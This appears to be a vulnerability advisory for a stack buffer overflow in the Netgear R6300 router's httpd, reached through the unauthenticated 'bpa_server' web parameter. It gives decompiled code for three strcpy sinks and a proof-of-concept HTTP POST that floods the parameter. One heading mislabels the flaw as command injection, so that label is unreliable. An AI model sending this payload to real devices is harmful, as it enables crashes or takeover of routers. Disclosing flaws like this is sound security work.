# Buffer Overflow Vulnerability in `bpa_server`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | Netgear R6300 Router                                         |
| Firmware Version     | V1.0.2.80_1.0.59                                             |
| Vulnerability Type   | **Buffer Overflow**                                          |
| Vulnerable Component | `httpd` (`basicCgiCdlBpa` → `acosNvramConfig_set` → `blkGetDetWanResultCgi` / `cdlCgiDetWan` / `wizCgiDetWan`) |
| Prerequisites        | No authentication required; attacker must supply crafted input via web interface parameter `bpa_server` |

2. Exploitation Path

```c
int __fastcall basicCgiCdlBpa(char *a1, int a2)
{
  ...
  char v7[256]; // [sp+18h] [-100h] BYREF
  websGetVar(a1, "bpa_idletime", v7);
  if ( atoi(v7) < 100 )
  {
    acosNvramConfig_set("bpa_idletime", v7);
    acosNvramConfig_set("wan_proto", &off_4ED680);
    websGetVar(a1, "bpa_server", v7);
    acosNvramConfig_set("bpa_server", v7);
    ...
}
  
int __fastcall blkGetDetWanResultCgi(int a1, int a2)
{
  ...
  char v19[150]; // [sp+30h] [-298h] BYREF
  ...
  else
  {
    if ( !stristr(v20, &off_4D8E5C) )
      goto LABEL_15;
    dword_5B4AD0 |= 8u;
    v9 = (const char *)acosNvramConfig_get("bpa_server");
    strcpy(v19, v9);
    ...
}
  
int __fastcall cdlCgiDetWan(int a1, int a2)
{
  ...
  char v26[150]; // [sp+B0h] [-298h] BYREF
  ...
  {
    if ( !stristr(v27, "dhcp") )
    {
      if ( stristr(v27, "pptp") )
      {
        dword_5B8130 |= 4u;
        acosNvramConfig_set("pptp_serv_ip", "10.0.0.138");
      }
      else if ( stristr(v27, &off_4D8E5C) )
      {
        dword_5B8130 |= 8u;
        v12 = (const char *)acosNvramConfig_get("bpa_server");
        strcpy(v26, v12);
        ...
}
      
int __fastcall wizCgiDetWan(int a1, int a2)
{
  ...
  char v17[150]; // [sp+30h] [-298h] BYREF
  ...
  if ( v5 )
  {
    ...
    else
    {
      if ( !stristr(v18, "dhcp") )
      {
        if ( stristr(v18, "pptp") )
        {
          dword_5B3030 |= 4u;
          acosNvramConfig_set("pptp_serv_ip", "10.0.0.138");
        }
        else if ( stristr(v18, &off_4D8E5C) )
        {
          dword_5B3030 |= 8u;
          v10 = (const char *)acosNvramConfig_get("bpa_server");
          strcpy(v17, v10);
          ...
}
```

3. **Vulnerable Binaries:** The vulnerability resides in the `httpd` binary.

4. 0-Day Command Injection Exploitation Path: 
   - In the `basicCgiCdlBpa` function at line 10, the call `websGetVar(a1, "bpa_server", v7)` receives input. Although a 255-byte length restriction is enforced, no further validation is applied. The input is stored via `acosNvramConfig_set("bpa_server", v7)` at line 11. Subsequently, the `blkGetDetWanResultCgi` function retrieves the value at line 25 using `v9 = (const char *)acosNvramConfig_get("bpa_server")`, and copies it into the destination buffer `v19` via `strcpy(v19, v9)` at line 26. Since `v19` is only 150 bytes in size, this results in a buffer overflow vulnerability.
   - In the same data flow, after storage in `acosNvramConfig_set("bpa_server", v7)`, the `cdlCgiDetWan` function retrieves the value at line 46 via `v12 = (const char *)acosNvramConfig_get("bpa_server")`, and copies it into the destination buffer `v26` with `strcpy(v26, v12)` at line 47. The buffer `v26` is limited to 150 bytes, leading to a buffer overflow vulnerability.
   - Similarly, after the same storage operation, the `wizCgiDetWan` function retrieves the value at line 71 via `v10 = (const char *)acosNvramConfig_get("bpa_server")`, and copies it into the destination buffer `v17` using `strcpy(v17, v10)` at line 72. The buffer `v17` is also 150 bytes in size, resulting in a buffer overflow vulnerability.

5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /cgi-bin/basicCgiCdlBpa HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 300
Connection: close

bpa_server=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```